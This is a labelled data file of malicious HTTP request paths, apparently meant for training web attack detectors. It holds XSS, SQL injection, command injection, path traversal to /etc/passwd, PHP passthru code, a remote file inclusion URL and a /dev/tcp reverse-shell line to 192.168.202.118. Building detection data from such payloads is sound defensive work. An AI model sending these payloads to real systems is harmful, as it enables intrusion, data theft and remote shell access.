sentences 	 labels
/ webcalendar / week . php ? user =  \  "  >  < script > alert ( document . cookie )  <  / script >  \r\n\r\n 	 1
/ string / strings / parameters = ;  str =  $  ( echo kfnnby )  ;  str1 =  $  {  # str }  ;  if  [  3 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  |  \r\n\r\n 	 1
/ string / strings / parameters = < body > hello <  / body >  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  +  ( select xwcl where 7997 = 7997 ; select dbms_pipe . receive_message ( chr ( 112 )  |  | chr ( 70 )  |  | chr ( 106 )  |  | chr ( 78 )  , 5 )  from dual --  \r\n\r\n 	 1
/ string / strings / parameters = 1 )  )  )  and sleep ( 5 )  #  \r\n\r\n 	 1
/ string / strings / parameters = |  | echo $ ifsiufxef $  (  ( 53 + 74 )  )  $  ( echo $ ifsiufxef ) iufxef /  /  \r\n\r\n 	 1
/  < script > document . cookie =  " testbgqj = 6434 ;  "  <  / script >  \r\n\r\n 	 1
/ aj3pf49c . php ?  < script > document . cookie =  " testnofv = 4170 ;  "  <  / script >  \r\n\r\n 	 1
/ string / strings / parameters = "  |   [  7 -ne  $  ( echo pmdmjz  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  \  \  \r\n\r\n 	 1
/ cgi-bin / base_local_rules . php ? dir =  < script > alert (  ' base_local_rules_xss . nasl-1331905098 '  )  <  / script >  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  +  ( select  ' jkgf '  where 7487 = 7487 ; select dbms_pipe . receive_message ( chr ( 112 )  |  | chr ( 70 )  |  | chr ( 106 )  |  | chr ( 78 )  , 5 )  from dual --  \r\n\r\n 	 1
/ examples / jsp / error / shoutbox . php ? conf =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  \r\n\r\n 	 1
/ e9rx3ya4 . dll ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 1
/ x2gyorli . pl ?  < script > document . cookie =  " testwhac = 3130 ;  "  <  / script >  \r\n\r\n 	 1
/ jw64yq8u . cfm ?  < meta http-equiv = set-cookie content =  " testylfu = 1313 "  >  \r\n\r\n 	 1
/ modules / projects / index . php ? full_path = xxpathxx  \r\n\r\n 	 1
/ r3le3om5 . php3 ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 1
/ string / strings / parameters = 1 %  "  "  )  and 3715 in  (  ( char ( 113 )  + char ( 113 )  + char ( 112 )  + char ( 106 )  + char ( 113 )  +  ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end )  )  + char ( 113 )  + char ( 122 )  + char ( 118 )  + char ( 122 )  + char ( 113 )  )  )  and  (  "  "  %  "  "  =  "  "  \r\n\r\n 	 1
/ string / modo = entrar & login = takagi71 & pwd = b6e & remember =  '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  & b1 = entrar  \r\n\r\n 	 1
/ string / strings / parameters = -6587 '  )  union all select 6349 , 6349 , 6349 , 6349 , 6349 , 6349 , 6349 , 6349 , 6349 , 6349 --  \r\n\r\n 	 1
/ 6n7aacgg . x ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 1
/ string / strings / parameters = 1 "  "  and 5556 =  ( select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 )  \r\n\r\n 	 1
/ examples / jsp / checkbox / index . php ? search =  '  >  < script > alert (  ' autoindex_search_xss . nasl '  )  ;  <  / script >  & searchmode = f  \r\n\r\n 	 1
/ scripts / sql . php ? lib_inc = 1 & btndrop = no & goto =  / etc / passwd  \r\n\r\n 	 1
/ twiki / bin / view / main / twikiusers ? rev = 3390  ` 0 <  & 86- ; exec 86 <  >  / dev / tcp / 192 . 168 . 202 . 118 / 35392 ; sh  <  & 86  >  & 86 2 >  & 86 `  #  \r\n\r\n 	 1
/ string / strings / parameters = |   [  8 -ne  $  ( echo ifefqd  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  &  \r\n\r\n 	 1
/ cgi / gwweb . exe ? help = bad-request  \r\n\r\n 	 1
/ string / strings / parameters = )  ;  } print (  ` echo jiihyt ; echo  $  (  ( 7 + 65 )  )  ; echo jiihyt ; echo jiihyt `  )  ;  )  } jiihyt  \r\n\r\n 	 1
/ string / modo = entrar & login = gen /  / nie & pwd = circunfuso & remember = on & b1 = entrar  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  )  where 1646 = 1646 or 9643 =  ( select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 )  --  \r\n\r\n 	 1
/ 9o6g5vkn . do ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 1
/ string / strings / parameters = -6222 )  )  or 4493 = utl_inaddr . get_host_address ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  and  (  ( 3230 = 3230  \r\n\r\n 	 1
/ examples / jsp / jsp2 / jspx / sawmillcl . exe ? ho +  { complete_version }  \r\n\r\n 	 1
/ string / id = 3 & nombre = jamn + ibrico & precio = 85bob @  < script > alert ( paros )  <  / script >  . parosproxy . org & cantidad = 7 & b1 = aadir + al + carrito  \r\n\r\n 	 1
/  ?  < meta http-equiv = set-cookie content =  " testviqu = 1270 "  >  \r\n\r\n 	 1
/ en-us / 33y9gcqq . nsf ?  < meta http-equiv = set-cookie content =  " testnvxc = 4301 "  >  \r\n\r\n 	 1
/ string / strings / parameters = |  | echo $ ifsoqujvo $  (  ( 83 + 79 )  )  $  ( echo $ ifsoqujvo ) oqujvo "  \r\n\r\n 	 1
/ string / strings / parameters = -3215 "  "  )  union all select 4457 , 4457 , 4457 , 4457 , 4457 #  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  )  and 8635 =  ( select count (  *  )  from generate_series ( 1 , 5000000 )  )  --  \r\n\r\n 	 1
/ string / strings / parameters = 1 "  "  )  )  )  and char ( 120 )  |  | char ( 106 )  |  | char ( 117 )  |  | char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 )  , 0 )  , 5000000000 )  , null )  and  (  (  (  "  " wile "  "  like  "  " wile  \r\n\r\n 	 1
/ examples / jsp / error / index . php ? cat_select =  < script > foo <  / script >  \r\n\r\n 	 1
/ string / modo = insertar & precio = 9350 & b1 =  |  \r\n\r\n 	 1
/ string / strings / parameters = <  * datahtmlelements *   * dataevents *  =  " javascript : parent . customlog (  '  * datahtmlelements *   * dataevents *  '  )  "  >  <  /  * datahtmlelements *  >  \r\n\r\n 	 1
/ string / modo = any ?  set-cookie :  + tamper = 5765205567234876235 & login = brooksba & pwd = papilla & remember = on & b1 = entrar  \r\n\r\n 	 1
/ string / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo kjbkaz )   &  &  str1 =  $  {  # str }   &  &   [  7 -eq  $  { str1 }   ]   &  &  sleep 1  \r\n\r\n 	 1
/ string / strings / parameters = |   [  6 -ne  $  ( echo ftwokg  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  |  \r\n\r\n 	 1
/ string / strings / parameters = |   [  8 -ne  $  ( echo dajiyu  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  |  \r\n\r\n 	 1
/ examples / jsp / jsp2 / el / login . php ? lang =  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 . txt  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  )  as lewd where 3118 = 3118 order by 1 --  \r\n\r\n 	 1
/ string / strings / parameters = | echo suhdbu $  (  ( 66 + 15 )  )  $  ( echo suhdbu ) suhdbu  \r\n\r\n 	 1
/ cacti / crystalimagehandler . aspx ? dynamicimage =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / winnt / system . ini  \r\n\r\n 	 1
/ manager / ion-p . exe ? page = c :  \  \ winnt \  \ win . ini  \r\n\r\n 	 1
/ examples / jsp / num / user . cgi ? url =  "  >  < script > alert (  " gossamer_links_url_xss . nasl "  )  ;  <  / script >  & from = add  \r\n\r\n 	 1
/ string / modo = registro & login = cowley & password = b1jed7ad & nombre = wernerany  set-cookie :  + tamper = 5765205567234876235 & apellidos = santiago + espejel & email = okeefe . gilger0 @ ajuntamentdebarcelona2-0 . in & dni = 87784817g & direccion = carretera + del + carmel + 99 +  & ciudad = ribafrecha & cp = 40331 & provincia = a + corua & ntc = 3867909567368782 & b1 = registrar  \r\n\r\n 	 1
/ examples / jsp / error / workarea / contentdesigner / ekformsiframe . aspx ? id =  "  >  < script > alert (  ' nessus '  )  <  / script >  \r\n\r\n 	 1
/ vjbrrppi . php ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 1
/ string / strings / parameters = ; echo $ ifsdwczmd $  (  ( 39 + 76 )  )  $  ( echo $ ifsdwczmd ) dwczmd |  \r\n\r\n 	 1
/ string / strings / parameters = 1 "  "  )  where 9680 = 9680 and  ( select 2 *  ( if (  ( select  *  from  ( select concat ( 0x7171706a71 ,  ( select  ( elt ( 3484 = 3484 , 1 )  )  )  , 0x717a767a71 , 0x78 )  ) s )  ,  8446744073709551610 ,  8446744073709551610 )  )  )  --  \r\n\r\n 	 1
/ esmozg5d . dll ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 1
/ string / strings / parameters = ;  str =  $  ( echo ewchct )  ;  str1 =  $  {  # str }  ;  if  [  3 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  &  \r\n\r\n 	 1
/ 5qnlm5z2 . mscgi ?  < meta http-equiv = set-cookie content =  " testsixi = 8451 "  >  \r\n\r\n 	 1
/ string / strings / parameters = & echo $ ifsudhxjk $  (  ( 28 + 24 )  )  $  ( echo $ ifsudhxjk ) udhxjk "  \r\n\r\n 	 1
/ string / strings / parameters = "  ;  str =  $  ( echo upzcij )  ;  str1 =  $  {  # str }  ;  if  [  6 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  &  \r\n\r\n 	 1
/ string / strings / parameters = |   [  9 -ne  $  ( echo cwnamn  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  "  \r\n\r\n 	 1
/ jnt3f86c . exe ?  < script > document . cookie =  " testcmax = 9270 ;  "  <  / script >  \r\n\r\n 	 1
/ string / strings / parameters = 1 "  "  )  )  as bosq where 4695 = 4695 ; select benchmark ( 5000000 , md5 ( 0x714e4153 )  )  #  \r\n\r\n 	 1
/ main . php ? stuff =  "  & ver \ x0c > q69516617 & rem \ x0c  \r\n\r\n 	 1
/ string / strings / parameters = < script >  /  *   *  \ x00 / javascript : alert ( 1 )  /  /   *  /  <  / script >  \r\n\r\n 	 1
/ javascript / cert . exe  \r\n\r\n 	 1
/ main . php ? frm_daynight = day & frm_passwd = q82795564 & frm_referer = http :  /  / 192 . 168 . 28 . 202 / main . php & frm_user =  & scr_height =  & scr_width =  \r\n\r\n 	 1
/ examples / jsp / colors / index . php ? template =  .  .  /  .  .  /  .  .  / loudblog / custom / config . php \ x00  \r\n\r\n 	 1
/ script / tick / allincludefortick . php ? path_to_code = http :  /  / 192 . 168 . 202 . 118 : 8080 / ghl9il ?  \r\n\r\n 	 1
/ javascript / homepage . exe  \r\n\r\n 	 1
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo jsqhho )   &  &  str1 =  $  {  # str }   &  &   [  3 -eq  $  { str1 }   ]   &  &  sleep 1  |  \r\n\r\n 	 1
/ string / strings / parameters = |  | echo gltvha $  (  ( 47 + 68 )  )  $  ( echo gltvha ) gltvha "  \r\n\r\n 	 1
/ string / str =  $  ( echo gskkxz )   str1 =  $  {  # str }   if  [  9 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  #  \r\n\r\n 	 1
/ string / modo = entrar & login = don & pwd = co4tro5ersa & remember =  @ 40 & b1 = entrar  \r\n\r\n 	 1
/ examples / jsp / cal / wikka . php ? wakka = homepage /  .  .  /  .  .  / actions / wikkachanges  \r\n\r\n 	 1
/ moodle / filter / tex / texed . php ? formdata = foo & pathname = foo "  +  |  |  + echo + 1a00 +  >  > esbq  \r\n\r\n 	 1
/ string / strings / parameters = "  >  < svg onload =  " confirm ( 7 )  "  >  \r\n\r\n 	 1
/ string / strings / parameters = 1 "  "  )  )  )  rlike sleep ( 5 )  and  (  (  (  "  " qcqx "  "  like  "  " qcqx  \r\n\r\n 	 1
/ cgis / c32web . exe / getimage ? imagename = customeremail . txt \ x00 . pdf  \r\n\r\n 	 1
/ string / modo = registro & login = warun & password = paloteo & nombre = regis & apellidos = deudor + ortodo & email = salvador @ bijoubijoudiferente . ec & dni = 09115235j & direccion = avda .  + monaste + r + io + d * e + huelgas + 32 ,  + 4 ? c & ciudad = santa + maria + d ' ol & cp = 18518 & provincia = palencia & ntc = 9339123760594436 & b1 = registrar  \r\n\r\n 	 1
/ ybz5rz7a . cfm ?  < script > document . cookie =  " testsbvw = 6289 ;  "  <  / script >  \r\n\r\n 	 1
/ scripts / wiki . php /  < script > foo <  / script >  \r\n\r\n 	 1
/ string / strings / parameters = 1 %  "  "  )  )  )  ; select case when 4176 = 6138 then 1 else null end --  \r\n\r\n 	 1
/  .  .  % u2216 .  .  % u2216 .  .  % u2216 .  .  % u2216 .  .  % u2216 .  .  % u2216 { file }  \r\n\r\n 	 1
/ en-us / account / install . php ? newlang =  .  .  /  .  .  / cpg_error . log \ x00  \r\n\r\n 	 1
/ string / modo = registro & login = hughie & password = obstinarse & nombre = mohamed & apellidos = _guile / lla & email = somchart @ aeag . edu & dni = 24856792w & direccion = c /  + poeta + muhammad + iqbal ,  + 9 + 10g & ciudad = valle + gran + rey & cp = 09610 & provincia = a + corua & ntc = 8348395638560525 & b1 = registrar  \r\n\r\n 	 1
/ examples / jsp / jsp2 / jspx / sendtemp . pl ? templ =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  \r\n\r\n 	 1
/ en-us / account / setcookie . php ? u =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 & plugin = pblang_mult_flaws . nasl  \r\n\r\n 	 1
/ string / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo xgxykb )   &  &  str1 =  $  {  # str }   &  &   [  9 -eq  $  { str1 }   ]   &  &  sleep 1  "  \r\n\r\n 	 1
/ mv8wxfy9 . pl ?  < script > document . cookie =  " testrhbc = 8184 ;  "  <  / script >  \r\n\r\n 	 1
/ help . php ? q =  " ping ; -w ; 8000 ; -n ; 1 ; 1 . 2 . 3 . 4 | rem ;  \r\n\r\n 	 1
/ floridian \  ' s /  \r\n\r\n 	 1
/ admin / index . php ? path_to_script = xxpathxx ?  & cmd = ls  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  )  ; select dbms_pipe . receive_message ( chr ( 66 )  |  | chr ( 67 )  |  | chr ( 79 )  |  | chr ( 101 )  , 5 )  from dual and  (  ' ztmd '  =  ' ztmd  \r\n\r\n 	 1
/ string / modo = registro & login = duvarci & password = ar2erament0 & nombre = olimpia & apellidos = favela & email = romano @ streaptease . sh & dni = 99991019z +  & direccion = c /  + panama ,  + 122 ,  +  & ciudad = navales & cp = 02250 & provincia = baleares +  ( illes )  & ntc = 0227903176160725 & b1 = registrar  \r\n\r\n 	 1
/ string / strings / parameters = "  + if ( benchmark ( 3000000 , md5 ( 1 )  )  , null , null )  , null , null , null , null , null , null , null )   #  \r\n\r\n 	 1
/ scripts / index . php ? x = browse & category =  ' union select  ' 1 '  ,  ' 2 '  ,  ' pixelpost_category_sql_injection . nasl '  ,  ' 1331919219 '  ,  ' 5 '  --  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  ; create or replace function sleep ( int )  returns int as  '  / lib / libc . so . 6 '  ,  ' sleep '  language  ' c '  strict ;  select sleep ( 5 )  and  ' gajm '  =  ' gajm  \r\n\r\n 	 1
/ string / strings / parameters = ; echo $ ifsnazrra $  (  ( 96 + 66 )  )  $  ( echo $ ifsnazrra ) nazrra \  \  \r\n\r\n 	 1
/ string / strings / parameters = "  & echo $ ifswzxinw $  (  ( 50 + 11 )  )  $  ( echo $ ifswzxinw ) wzxinw \  \r\n\r\n 	 1
/ modules / mod_as_category / mod_as_category . php ? mosconfig_absolute_path = xxpathxx  \r\n\r\n 	 1
/ examples / jsp / sessions / awstatstotals . php ? sort =  "  ]  . passthru (  ' id '  )  . exit (  )  .  $ a [  "  \r\n\r\n 	 1
/ string / strings / parameters = ;  str =  $  ( echo nmeesi )  ;  str1 =  $  {  # str }  ;  if  [  5 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  "  \r\n\r\n 	 1
/ quickstore . cgi ? nessus & template =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00html  \r\n\r\n 	 1
/ javascript / phpnuke . exe  \r\n\r\n 	 1
/ string / strings / parameters = 1 "  "  )  and 9254 =  ( select count (  *  )  from rdb $ fields as t1 , rdb $ types as t2 , rdb $ collations as t3 , rdb $ functions as t4 )  --  \r\n\r\n 	 1
/ examples / jsp / num / alienform . cgi ? _browser_out =  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  / etc / passwd  \r\n\r\n 	 1
/ n1afe1y6 . do ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 1
/ string / strings / parameters = | echo $ ifsjwhqhe $  (  ( 54 + 5 )  )  $  ( echo $ ifsjwhqhe ) jwhqhe |  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  or updatexml ( 1808 , concat ( 0x2e , 0x7171706a71 ,  ( select  ( elt ( 1808 = 1808 , 1 )  )  )  , 0x717a767a71 )  , 8666 )  and  ' esjl '  =  ' esjl  \r\n\r\n 	 1
/ cgi-home / pfdispaly . cgi ?  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  \r\n\r\n 	 1
/ javascript / signup . exe  \r\n\r\n 	 1
/ string / modo = entrar & login = zamp ' ino & pwd = frutillero & remember = off & b1 = entrar  \r\n\r\n 	 1
/ string / strings / parameters = 1 "  "  or 4411 =  ( select count (  *  )  from sysusers as sys1 , sysusers as sys2 , sysusers as sys3 , sysusers as sys4 , sysusers as sys5 , sysusers as sys6 , sysusers as sys7 )  and  "  " snht "  "  =  "  " snht  \r\n\r\n 	 1
/ string / strings / parameters = 1 "  "  )  where 6072 = 6072 and 2388 = benchmark ( 5000000 , md5 ( 0x6d457153 )  )  #  \r\n\r\n 	 1
/ moodle / filter / tex / texed . php ? formdata = foo & pathname = foo "  +  |  |  + echo + db + 00 + 00 + 00 + 00 + 00 + 00 + 40 + 30 + 00 + 00 + 34 + 30 + 00 + 00 + 00 + 00 + 00 + 00 + 00 + 00 + 00 + 00 + 00 + 00 + 00 +  +  >  > ctdn  \r\n\r\n 	 1
/ string / strings / parameters = "  . print (  ` echo coyiqb `  .  ` echo  $  (  ( 70 + 26 )  )  `  .  ` echo coyiqb `  .  ` echo coyiqb `  )  ; coyiqb  \r\n\r\n 	 1
/ javascript / document . sql  \r\n\r\n 	 1
/ string / strings / parameters = 1 )  )  as msug where 3503 = 3503 and sleep ( 5 )  #  \r\n\r\n 	 1
/ phpmyadmin / more . php ? id = 1 '  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  )  )  )  or  ( select 9173 from ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 9173 = 9173 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from information_schema . character_sets group by x ) a )  and  (  (  (  ' ymad '  like  ' ymad  \r\n\r\n 	 1
/ lsoix5h3 . jsp ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 1
/ quagynka . jsp ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 1
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo vdsmtk )   &  &  str1 =  $  {  # str }   &  &   [  2 -eq  $  { str1 }   ]   &  &  sleep 1  '  \r\n\r\n 	 1
/ nyvbv05h . htm ?  < script > document . cookie =  " testftxz = 5980 ;  "  <  / script >  \r\n\r\n 	 1
/ accountlogon . cfm ? rtn = 1 "  >  < script > alert (  " 411686083443 "  )  ;  <  / script >  <  " 234  \r\n\r\n 	 1
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo ehnnqt )   &  &  str1 =  $  {  # str }   &  &   [  7 -eq  $  { str1 }   ]   &  &  sleep 1  \r\n\r\n 	 1
/ string / strings / parameters = 1 "  "  )  )  as vigs where 6175 = 6175 or  ( select 2 *  ( if (  ( select  *  from  ( select concat ( 0x7171706a71 ,  ( select  ( elt ( 8113 = 8113 , 1 )  )  )  , 0x717a767a71 , 0x78 )  ) s )  ,  8446744073709551610 ,  8446744073709551610 )  )  )  --  \r\n\r\n 	 1
/ string / str =  $  ( echo xelppn )   str1 =  $  {  # str }   if  [  3 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  "  \r\n\r\n 	 1
/ string / strings / parameters = echo pvbscv $  (  ( 25 + 60 )  )  $  ( echo pvbscv ) pvbscv "  \r\n\r\n 	 1
/ string / id = 3 & nombre = ques + o + manchego & precio = 39 & cantidad = 3 & b1 = aadir + al + carrito  \r\n\r\n 	 1
/ string / strings / parameters = -4182 )  )  as wkfh where 6145 = 6145 union all select 6145 , 6145 , 6145 , 6145 , 6145 #  \r\n\r\n 	 1
/ scripts / index . php ? id =  ' union /  *  *  / select /  *  *  / 0 , 0 , 1327215788 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 --  \r\n\r\n 	 1
/ javascript / entertainment . exe  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  )  )  )  and 3707 =  ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 )  and  (  (  (  ' viad '  like  ' viad  \r\n\r\n 	 1
/  .  .  .  /  .  .  .  /  .  .  .  /  .  .  .  /  .  .  .  /  { file }  \r\n\r\n 	 1
/ string / strings / parameters = -6798 %  "  "  )  )  )  or 3440 = cast (  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  )  |  |  ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end )  )  :  : text |  |  ( chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  as numeric )  and  (  (  (  "  "  %  "  "  =  "  "  \r\n\r\n 	 1
/ string / strings / parameters = 1 %  "  "  )  )  union all select null , null , null , null , null , null , null , null , null #  \r\n\r\n 	 1
/ clubbox . exe /  \r\n\r\n 	 1
